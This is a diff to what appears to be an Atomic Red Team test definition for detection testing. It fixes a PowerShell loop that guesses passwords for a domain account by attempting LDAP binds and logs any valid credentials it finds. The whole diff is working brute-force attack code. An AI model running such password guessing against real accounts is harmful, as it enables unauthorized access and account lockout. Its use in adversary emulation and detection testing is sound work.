@@ -31,17 +31,17 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      $passwords = '#{passwords}'.split('`n')
+      $passwords = "#{passwords}".split("{`n}")
       $found = @()
       for ($i = 0; $i -lt #{number_of_attempts}; $i++) {
         "[-] Round ${i} of password guessing" | Out-File -FilePath #{output_file} -Append
         foreach ($password in $passwords){
           " [-] Attempting ${password} on account #{user}." | Out-File -FilePath #{output_file} -Append
-          if ((new-object directoryservices.directoryentry "",#{user},$password).psbase.name -ne $null) {
-            if (-not ($found.Contains("$($_.SamAccountName):${password}")){
-                " [!] $($_.SamAccountName):${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
-                $found += ,"$($_.SamAccountName):${password}"
-              }
+          if ((new-object directoryservices.directoryentry "","#{user}",$password).psbase.name -ne $null) {
+            if (-not ($found.Contains("#{user}:${password}")){
+                " [!] #{user}:${password} are valid credentials on domain #{domain}!" | Out-File -FilePath #{output_file} -Append
+                $found += ,"#{user}:${password}"
+            }
           }
         }
       }
